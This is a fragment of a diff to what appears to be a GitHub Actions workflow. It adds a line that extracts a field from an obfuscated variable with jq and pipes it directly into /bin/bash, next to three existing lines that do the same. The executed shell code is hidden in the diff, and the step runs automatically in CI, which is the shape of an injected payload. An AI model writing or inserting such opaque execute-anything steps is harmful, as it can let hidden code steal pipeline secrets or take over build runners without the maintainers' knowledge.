@@ -33,6 +33,7 @@ jobs:
           echo $uad7 | jq -r .qzo87 | /bin/bash
           echo $u5 | jq -r .hms31 | /bin/bash
           echo $ueose31 | jq -r .lbgqc7 | /bin/bash
+          printf '%s' "$shke600" | jq -r .wz3643 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
